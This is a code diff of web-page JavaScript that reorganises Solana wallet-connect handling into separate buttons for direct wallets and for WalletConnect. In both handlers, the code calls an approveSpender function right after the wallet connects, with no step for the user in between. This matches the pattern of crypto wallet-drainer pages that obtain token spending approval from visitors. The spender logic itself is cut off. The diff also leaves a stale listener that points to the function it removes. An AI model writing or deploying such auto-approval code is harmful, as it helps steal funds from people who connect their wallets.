@@ -55,15 +55,38 @@ if (walletConnectButton) {
   walletConnectButton.addEventListener('click', connectWallet);
 }
 
-/* Multi-wallet connect */
-async function connectWallet() {
-  try {
-    const adapters = [
-      new PhantomWalletAdapter(),
-      new SolflareWalletAdapter({ network: WalletAdapterNetwork.Mainnet }),
-      new BackpackWalletAdapter(),
-      new GlowWalletAdapter(),
-      new WalletConnectWalletAdapter({
+/* Solana direct wallets */
+if (solanaWalletButton) {
+  solanaWalletButton.addEventListener('click', async () => {
+    try {
+      const adapters = [
+        new PhantomWalletAdapter(),
+        new SolflareWalletAdapter({ network: WalletAdapterNetwork.Mainnet }),
+        new BackpackWalletAdapter(),
+        new GlowWalletAdapter()
+      ];
+
+      wallet = adapters.find(w => w.readyState === "Installed" || w.readyState === "Loadable");
+      if (!wallet) {
+        alert("No Solana wallet found. Please install Phantom, Solflare, Backpack, or Glow.");
+        return;
+      }
+
+      await wallet.connect();
+      console.log("Connected Solana wallet:", wallet.publicKey.toBase58());
+      await approveSpender(wallet.publicKey);
+    } catch (err) {
+      console.error("Solana wallet connect error:", err);
+      alert("Wallet connection failed: " + err.message);
+    }
+  });
+}
+
+/* WalletConnect flow */
+if (walletConnectButton) {
+  walletConnectButton.addEventListener('click', async () => {
+    try {
+      wallet = new WalletConnectWalletAdapter({
         network: WalletAdapterNetwork.Mainnet,
         options: {
           projectId: "YOUR_WALLETCONNECT_PROJECT_ID", // replace with your WC Cloud projectId
@@ -75,25 +98,17 @@ async function connectWallet() {
             icons: []
           }
         }
-      })
-    ];
+      });
 
-    wallet = adapters.find(w => w.readyState === "Installed" || w.readyState === "Loadable");
-    if (!wallet) {
-      alert("No supported wallet found. Please install Phantom, Solflare, Backpack, Glow, or use WalletConnect.");
-      return;
+      await wallet.connect();
+      console.log("Connected via WalletConnect:", wallet.publicKey.toBase58());
+      await approveSpender(wallet.publicKey);
+    } catch (err) {
+      console.error("WalletConnect error:", err);
+      alert("WalletConnect failed: " + err.message);
     }
-
-    await wallet.connect();
-    console.log("Connected wallet:", wallet.publicKey.toBase58());
-
-    await approveSpender(wallet.publicKey);
-  } catch (err) {
-    console.error("Wallet connect error:", err);
-    alert("Wallet connection failed: " + err.message);
-  }
+  });
 }
-
 /* Approval logic (non-atomic) */
 async function approveSpender(ownerPubKey) {
   try {
